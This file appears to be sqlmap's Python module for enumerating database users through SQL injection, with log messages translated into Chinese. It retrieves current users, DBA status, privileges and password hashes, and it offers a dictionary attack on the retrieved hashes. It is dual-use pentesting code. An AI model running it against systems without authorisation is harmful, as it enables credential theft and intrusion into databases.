#!/usr/bin/env python

"""
Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.agent import agent
from lib.core.common import arrayizeValue
from lib.core.common import Backend
from lib.core.common import filterPairValues
from lib.core.common import getLimitRange
from lib.core.common import isAdminFromPrivileges
from lib.core.common import isInferenceAvailable
from lib.core.common import isNoneValue
from lib.core.common import isNullValue
from lib.core.common import isNumPosStrValue
from lib.core.common import isTechniqueAvailable
from lib.core.common import parsePasswordHash
from lib.core.common import readInput
from lib.core.common import unArrayizeValue
from lib.core.compat import xrange
from lib.core.convert import encodeHex
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.dicts import DB2_PRIVS
from lib.core.dicts import FIREBIRD_PRIVS
from lib.core.dicts import INFORMIX_PRIVS
from lib.core.dicts import MYSQL_PRIVS
from lib.core.dicts import PGSQL_PRIVS
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import FORK
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapNoneDataException
from lib.core.exception import SqlmapUserQuitException
from lib.core.settings import CURRENT_USER
from lib.core.settings import PLUS_ONE_DBMSES
from lib.core.threads import getCurrentThreadData
from lib.request import inject
from lib.utils.hash import attackCachedUsersPasswords
from lib.utils.hash import storeHashesToFile
from lib.utils.pivotdumptable import pivotDumpTable
from thirdparty.six.moves import zip as _zip

class Users(object):
    """
    This class defines users' enumeration functionalities for plugins.
    """

    def __init__(self):
        kb.data.currentUser = ""
        kb.data.isDba = None
        kb.data.cachedUsers = []
        kb.data.cachedUsersPasswords = {}
        kb.data.cachedUsersPrivileges = {}
        kb.data.cachedUsersRoles = {}

    def getCurrentUser(self):
        infoMsg = "获取当前用户"
        logger.info(infoMsg)

        query = queries[Backend.getIdentifiedDbms()].current_user.query

        if not kb.data.currentUser:
            kb.data.currentUser = unArrayizeValue(inject.getValue(query))

        return kb.data.currentUser

    def isDba(self, user=None):
        infoMsg = "检查当前用户是否为DBA"
        logger.info(infoMsg)

        query = None

        if Backend.isDbms(DBMS.MYSQL):
            self.getCurrentUser()
            if Backend.isDbms(DBMS.MYSQL) and Backend.isFork(FORK.DRIZZLE):
                kb.data.isDba = "root" in (kb.data.currentUser or "")
            elif kb.data.currentUser:
                query = queries[Backend.getIdentifiedDbms()].is_dba.query % kb.data.currentUser.split("@")[0]
        elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE) and user is not None:
            query = queries[Backend.getIdentifiedDbms()].is_dba.query2 % user
        else:
            query = queries[Backend.getIdentifiedDbms()].is_dba.query

        if query:
            query = agent.forgeCaseStatement(query)
            kb.data.isDba = inject.checkBooleanExpression(query) or False

        return kb.data.isDba

    def getUsers(self):
        infoMsg = "获取数据库用户"
        logger.info(infoMsg)

        rootQuery = queries[Backend.getIdentifiedDbms()].users

        condition = (Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")))
        condition |= (Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema)

        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:
            if Backend.isDbms(DBMS.MYSQL) and Backend.isFork(FORK.DRIZZLE):
                query = rootQuery.inband.query3
            elif condition:
                query = rootQuery.inband.query2
            else:
                query = rootQuery.inband.query

            values = inject.getValue(query, blind=False, time=False)

            if not isNoneValue(values):
                kb.data.cachedUsers = []
                for value in arrayizeValue(values):
                    value = unArrayizeValue(value)
                    if not isNoneValue(value):
                        kb.data.cachedUsers.append(value)

        if not kb.data.cachedUsers and isInferenceAvailable() and not conf.direct:
            infoMsg = "获取数据库用户数量"
            logger.info(infoMsg)

            if Backend.isDbms(DBMS.MYSQL) and Backend.isFork(FORK.DRIZZLE):
                query = rootQuery.blind.count3
            elif condition:
                query = rootQuery.blind.count2
            else:
                query = rootQuery.blind.count

            count = inject.getValue(query, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

            if count == 0:
                return kb.data.cachedUsers
            elif not isNumPosStrValue(count):
                errMsg = "无法获取数据库用户数量"
                raise SqlmapNoneDataException(errMsg)

            plusOne = Backend.getIdentifiedDbms() in PLUS_ONE_DBMSES
            indexRange = getLimitRange(count, plusOne=plusOne)

            for index in indexRange:
                if Backend.getIdentifiedDbms() in (DBMS.SYBASE, DBMS.MAXDB):
                    query = rootQuery.blind.query % (kb.data.cachedUsers[-1] if kb.data.cachedUsers else " ")
                elif Backend.isDbms(DBMS.MYSQL) and Backend.isFork(FORK.DRIZZLE):
                    query = rootQuery.blind.query3 % index
                elif condition:
                    query = rootQuery.blind.query2 % index
                else:
                    query = rootQuery.blind.query % index

                user = unArrayizeValue(inject.getValue(query, union=False, error=False))

                if user:
                    kb.data.cachedUsers.append(user)

        if not kb.data.cachedUsers:
            errMsg = "无法获取数据库用户"
            logger.error(errMsg)

        return kb.data.cachedUsers

    def getPasswordHashes(self):
        infoMsg = "获取数据库用户密码哈希值"

        rootQuery = queries[Backend.getIdentifiedDbms()].passwords

        if conf.user == CURRENT_USER:
            infoMsg += " for current user"
            conf.user = self.getCurrentUser()

        logger.info(infoMsg)

        if conf.user and Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
            conf.user = conf.user.upper()

        if conf.user:
            users = conf.user.split(',')

            if Backend.isDbms(DBMS.MYSQL):
                for user in users:
                    parsedUser = re.search(r"['\"]?(.*?)['\"]?\@", user)

                    if parsedUser:
                        users[users.index(user)] = parsedUser.groups()[0]
        else:
            users = []

        users = [_ for _ in users if _]

        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:
            if Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")):
                query = rootQuery.inband.query2
            else:
                query = rootQuery.inband.query

            condition = rootQuery.inband.condition

            if conf.user:
                query += " WHERE "
                query += " OR ".join("%s = '%s'" % (condition, user) for user in sorted(users))

            if Backend.isDbms(DBMS.SYBASE):
                getCurrentThreadData().disableStdOut = True

                retVal = pivotDumpTable("(%s) AS %s" % (query, kb.aliasName), ['%s.name' % kb.aliasName, '%s.password' % kb.aliasName], blind=False)

                if retVal:
                    for user, password in filterPairValues(_zip(retVal[0]["%s.name" % kb.aliasName], retVal[0]["%s.password" % kb.aliasName])):
                        if user not in kb.data.cachedUsersPasswords:
                            kb.data.cachedUsersPasswords[user] = [password]
                        else:
                            kb.data.cachedUsersPasswords[user].append(password)

                getCurrentThreadData().disableStdOut = False
            else:
                values = inject.getValue(query, blind=False, time=False)

                if Backend.isDbms(DBMS.MSSQL) and isNoneValue(values):
                    values = inject.getValue(query.replace("master.dbo.fn_varbintohexstr", "sys.fn_sqlvarbasetostr"), blind=False, time=False)
                elif Backend.isDbms(DBMS.MYSQL) and (isNoneValue(values) or all(len(value) == 2 and (isNullValue(value[1]) or isNoneValue(value[1])) for value in values)):
                    values = inject.getValue(query.replace("authentication_string", "password"), blind=False, time=False)

                for user, password in filterPairValues(values):
                    if not user or user == " ":
                        continue

                    password = parsePasswordHash(password)

                    if user not in kb.data.cachedUsersPasswords:
                        kb.data.cachedUsersPasswords[user] = [password]
                    else:
                        kb.data.cachedUsersPasswords[user].append(password)

        if not kb.data.cachedUsersPasswords and isInferenceAvailable() and not conf.direct:
            fallback = False

            if not len(users):
                users = self.getUsers()

                if Backend.isDbms(DBMS.MYSQL):
                    for user in users:
                        parsedUser = re.search(r"['\"]?(.*?)['\"]?\@", user)

                        if parsedUser:
                            users[users.index(user)] = parsedUser.groups()[0]

            if Backend.isDbms(DBMS.SYBASE):
                getCurrentThreadData().disableStdOut = True

                query = rootQuery.inband.query

                retVal = pivotDumpTable("(%s) AS %s" % (query, kb.aliasName), ['%s.name' % kb.aliasName, '%s.password' % kb.aliasName], blind=True)

                if retVal:
                    for user, password in filterPairValues(_zip(retVal[0]["%s.name" % kb.aliasName], retVal[0]["%s.password" % kb.aliasName])):
                        password = "0x%s" % encodeHex(password, binary=False).upper()

                        if user not in kb.data.cachedUsersPasswords:
                            kb.data.cachedUsersPasswords[user] = [password]
                        else:
                            kb.data.cachedUsersPasswords[user].append(password)

                getCurrentThreadData().disableStdOut = False
            else:
                retrievedUsers = set()

                for user in users:
                    user = unArrayizeValue(user)

                    if user in retrievedUsers:
                        continue

                    if Backend.getIdentifiedDbms() in (DBMS.INFORMIX, DBMS.VIRTUOSO):
                        count = 1
                    else:
                        infoMsg = "获取密码哈希值数量 "
                        infoMsg += "for user '%s'" % user
                        logger.info(infoMsg)

                        if Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")):
                            query = rootQuery.blind.count2 % user
                        else:
                            query = rootQuery.blind.count % user

                        count = inject.getValue(query, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

                        if not isNumPosStrValue(count):
                            if Backend.isDbms(DBMS.MSSQL):
                                fallback = True
                                count = inject.getValue(query.replace("master.dbo.fn_varbintohexstr", "sys.fn_sqlvarbasetostr"), union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
                            elif Backend.isDbms(DBMS.MYSQL):
                                fallback = True
                                count = inject.getValue(query.replace("authentication_string", "password"), union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

                        if not isNumPosStrValue(count):
                            warnMsg = "无法获取用户 '%s' 的密码哈希值数量" % user
                            logger.warning(warnMsg)
                            continue

                    infoMsg = "获取用户 '%s' 的密码哈希值" % user
                    logger.info(infoMsg)

                    passwords = []

                    plusOne = Backend.getIdentifiedDbms() in PLUS_ONE_DBMSES
                    indexRange = getLimitRange(count, plusOne=plusOne)

                    for index in indexRange:
                        if Backend.isDbms(DBMS.MSSQL):
                            if Backend.isVersionWithin(("2005", "2008")):
                                query = rootQuery.blind.query2 % (user, index, user)
                            else:
                                query = rootQuery.blind.query % (user, index, user)

                            if fallback:
                                query = query.replace("master.dbo.fn_varbintohexstr", "sys.fn_sqlvarbasetostr")

                        elif Backend.getIdentifiedDbms() in (DBMS.INFORMIX, DBMS.VIRTUOSO):
                            query = rootQuery.blind.query % (user,)

                        elif Backend.isDbms(DBMS.HSQLDB):
                            query = rootQuery.blind.query % (index, user)

                        else:
                            query = rootQuery.blind.query % (user, index)

                        if Backend.isDbms(DBMS.MYSQL):
                            if fallback:
                                query = query.replace("authentication_string", "password")

                        password = unArrayizeValue(inject.getValue(query, union=False, error=False))
                        password = parsePasswordHash(password)

                        passwords.append(password)

                    if passwords:
                        kb.data.cachedUsersPasswords[user] = passwords
                    else:
                        warnMsg = "无法获取用户 '%s' 的密码哈希值" % user
                        logger.warning(warnMsg)

                    retrievedUsers.add(user)

        if not kb.data.cachedUsersPasswords:
            errMsg = "无法获取数据库用户的密码哈希值"
            logger.error(errMsg)
        else:
            for user in kb.data.cachedUsersPasswords:
                kb.data.cachedUsersPasswords[user] = list(set(kb.data.cachedUsersPasswords[user]))

            storeHashesToFile(kb.data.cachedUsersPasswords)

            message = "是否要对获取到的密码哈希值进行字典攻击？ [Y/n/q]"
            choice = readInput(message, default='Y').upper()

            if choice == 'N':
                pass
            elif choice == 'Q':
                raise SqlmapUserQuitException
            else:
                attackCachedUsersPasswords()

        return kb.data.cachedUsersPasswords

    def getPrivileges(self, query2=False):
        infoMsg = "获取数据库用户权限"

        rootQuery = queries[Backend.getIdentifiedDbms()].privileges

        if conf.user == CURRENT_USER:
            infoMsg += " for current user"
            conf.user = self.getCurrentUser()

        logger.info(infoMsg)

        if conf.user and Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
            conf.user = conf.user.upper()

        if conf.user:
            users = conf.user.split(',')

            if Backend.isDbms(DBMS.MYSQL):
                for user in users:
                    parsedUser = re.search(r"['\"]?(.*?)['\"]?\@", user)

                    if parsedUser:
                        users[users.index(user)] = parsedUser.groups()[0]
        else:
            users = []

        users = [_ for _ in users if _]

        # 包含DBMS管理员列表的集合
        areAdmins = set()

        if not kb.data.cachedUsersPrivileges and any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:
            if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                query = rootQuery.inband.query2
                condition = rootQuery.inband.condition2
            elif Backend.isDbms(DBMS.ORACLE) and query2:
                query = rootQuery.inband.query2
                condition = rootQuery.inband.condition2
            else:
                query = rootQuery.inband.query
                condition = rootQuery.inband.condition

            if conf.user:
                query += " WHERE "

                if Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema:
                    query += " OR ".join("%s LIKE '%%%s%%'" % (condition, user) for user in sorted(users))
                else:
                    query += " OR ".join("%s = '%s'" % (condition, user) for user in sorted(users))

            values = inject.getValue(query, blind=False, time=False)

            if not values and Backend.isDbms(DBMS.ORACLE) and not query2:
                infoMsg = "尝试使用表 'USER_SYS_PRIVS'"
                logger.info(infoMsg)

                return self.getPrivileges(query2=True)

            if not isNoneValue(values):
                for value in values:
                    user = None
                    privileges = set()

                    for count in xrange(0, len(value or [])):
                        # 第一列始终是用户名
                        if count == 0:
                            user = value[count]

                        # 其他列是权限
                        else:
                            privilege = value[count]

                            if privilege is None:
                                continue

                            # 在PostgreSQL中,如果权限为True,则得到1,否则得到0
                            if Backend.isDbms(DBMS.PGSQL) and getUnicode(privilege).isdigit():
                                if int(privilege) == 1 and count in PGSQL_PRIVS:
                                    privileges.add(PGSQL_PRIVS[count])

                            # 在MySQL >= 5.0和Oracle中,我们得到权限列表作为字符串
                            elif Backend.isDbms(DBMS.ORACLE) or (Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema) or Backend.getIdentifiedDbms() in (DBMS.VERTICA, DBMS.MIMERSQL, DBMS.CUBRID):
                                privileges.add(privilege)

                            # 在MySQL < 5.0中,如果权限为True,则得到Y,否则得到N
                            elif Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                                if privilege.upper() == 'Y':
                                    privileges.add(MYSQL_PRIVS[count])

                            # 在Firebird中,我们得到每个权限的一个字母
                            elif Backend.isDbms(DBMS.FIREBIRD):
                                if privilege.strip() in FIREBIRD_PRIVS:
                                    privileges.add(FIREBIRD_PRIVS[privilege.strip()])

                            # 在DB2中,如果权限为True,则得到Y或G,否则得到N
                            elif Backend.isDbms(DBMS.DB2):
                                privs = privilege.split(',')
                                privilege = privs[0]
                                if len(privs) > 1:
                                    privs = privs[1]
                                    privs = list(privs.strip())
                                    i = 1

                                    for priv in privs:
                                        if priv.upper() in ('Y', 'G'):
                                            for position, db2Priv in DB2_PRIVS.items():
                                                if position == i:
                                                    privilege += ", " + db2Priv

                                        i += 1

                                privileges.add(privilege)

                    if user in kb.data.cachedUsersPrivileges:
                        kb.data.cachedUsersPrivileges[user] = list(privileges.union(kb.data.cachedUsersPrivileges[user]))
                    else:
                        kb.data.cachedUsersPrivileges[user] = list(privileges)

        if not kb.data.cachedUsersPrivileges and isInferenceAvailable() and not conf.direct:
            if Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema:
                conditionChar = "LIKE"
            else:
                conditionChar = "="

            if not len(users):
                users = self.getUsers()

                if Backend.isDbms(DBMS.MYSQL):
                    for user in users:
                        parsedUser = re.search(r"['\"]?(.*?)['\"]?\@", user)

                        if parsedUser:
                            users[users.index(user)] = parsedUser.groups()[0]

            retrievedUsers = set()

            for user in users:
                outuser = user
                if user in retrievedUsers:
                    continue

                if Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema:
                    user = "%%%s%%" % user

                if Backend.isDbms(DBMS.INFORMIX):
                    count = 1
                else:
                    infoMsg = "获取权限数量 "
                    infoMsg += "for user '%s'" % outuser
                    logger.info(infoMsg)

                    if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                        query = rootQuery.blind.count2 % user
                    elif Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema:
                        query = rootQuery.blind.count % (conditionChar, user)
                    elif Backend.isDbms(DBMS.ORACLE) and query2:
                        query = rootQuery.blind.count2 % user
                    else:
                        query = rootQuery.blind.count % user

                    count = inject.getValue(query, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

                    if not isNumPosStrValue(count):
                        if not retrievedUsers and Backend.isDbms(DBMS.ORACLE) and not query2:
                            infoMsg = "尝试使用表 'USER_SYS_PRIVS'"
                            logger.info(infoMsg)

                            return self.getPrivileges(query2=True)

                        warnMsg = "无法获取用户 '%s' 的权限数量" % outuser
                        logger.warning(warnMsg)
                        continue

                infoMsg = "获取用户 '%s' 的权限" % outuser
                logger.info(infoMsg)

                privileges = set()

                plusOne = Backend.getIdentifiedDbms() in PLUS_ONE_DBMSES
                indexRange = getLimitRange(count, plusOne=plusOne)

                for index in indexRange:
                    if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                        query = rootQuery.blind.query2 % (user, index)
                    elif Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema:
                        query = rootQuery.blind.query % (conditionChar, user, index)
                    elif Backend.isDbms(DBMS.ORACLE) and query2:
                        query = rootQuery.blind.query2 % (user, index)
                    elif Backend.isDbms(DBMS.FIREBIRD):
                        query = rootQuery.blind.query % (index, user)
                    elif Backend.isDbms(DBMS.INFORMIX):
                        query = rootQuery.blind.query % (user,)
                    else:
                        query = rootQuery.blind.query % (user, index)

                    privilege = unArrayizeValue(inject.getValue(query, union=False, error=False))

                    if privilege is None:
                        continue

                    # 在PostgreSQL中,如果权限为True,则得到1,否则得到0
                    if Backend.isDbms(DBMS.PGSQL) and ", " in privilege:
                        privilege = privilege.replace(", ", ',')
                        privs = privilege.split(',')
                        i = 1

                        for priv in privs:
                            if priv.isdigit() and int(priv) == 1 and i in PGSQL_PRIVS:
                                privileges.add(PGSQL_PRIVS[i])

                            i += 1

                    # 在MySQL >= 5.0和Oracle中,我们得到权限列表作为字符串
                    elif Backend.isDbms(DBMS.ORACLE) or (Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema) or Backend.getIdentifiedDbms() in (DBMS.VERTICA, DBMS.MIMERSQL, DBMS.CUBRID):
                        privileges.add(privilege)

                    # 在MySQL < 5.0中,如果权限为True,则得到Y,否则得到N
                    elif Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                        privilege = privilege.replace(", ", ',')
                        privs = privilege.split(',')
                        i = 1

                        for priv in privs:
                            if priv.upper() == 'Y':
                                for position, mysqlPriv in MYSQL_PRIVS.items():
                                    if position == i:
                                        privileges.add(mysqlPriv)

                            i += 1

                    # 在Firebird中,我们得到每个权限的一个字母
                    elif Backend.isDbms(DBMS.FIREBIRD):
                        if privilege.strip() in FIREBIRD_PRIVS:
                            privileges.add(FIREBIRD_PRIVS[privilege.strip()])

                    # 在Informix中,我们得到最高权限的一个字母
                    elif Backend.isDbms(DBMS.INFORMIX):
                        if privilege.strip() in INFORMIX_PRIVS:
                            privileges.add(INFORMIX_PRIVS[privilege.strip()])

                    # 在DB2中,如果权限为True,则得到Y或G,否则得到N
                    elif Backend.isDbms(DBMS.DB2):
                        privs = privilege.split(',')
                        privilege = privs[0]
                        privs = privs[1]
                        privs = list(privs.strip())
                        i = 1

                        for priv in privs:
                            if priv.upper() in ('Y', 'G'):
                                for position, db2Priv in DB2_PRIVS.items():
                                    if position == i:
                                        privilege += ", " + db2Priv

                            i += 1

                        privileges.add(privilege)

                    # 在MySQL < 5.0中,第一次获取用户的权限后,我们中断循环,否则会重复相同的查询
                    if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                        break

                if privileges:
                    kb.data.cachedUsersPrivileges[user] = list(privileges)
                else:
                    warnMsg = "无法获取用户 '%s' 的权限" % outuser
                    logger.warning(warnMsg)

                retrievedUsers.add(user)

        if not kb.data.cachedUsersPrivileges:
            errMsg = "无法获取数据库用户的权限"
            raise SqlmapNoneDataException(errMsg)

        for user, privileges in kb.data.cachedUsersPrivileges.items():
            if isAdminFromPrivileges(privileges):
                areAdmins.add(user)

        return (kb.data.cachedUsersPrivileges, areAdmins)

    def getRoles(self, query2=False):
        warnMsg = "在 %s 上,角色的概念不存在。sqlmap将枚举权限而不是角色" % Backend.getIdentifiedDbms()
        logger.warning(warnMsg)

        return self.getPrivileges(query2)
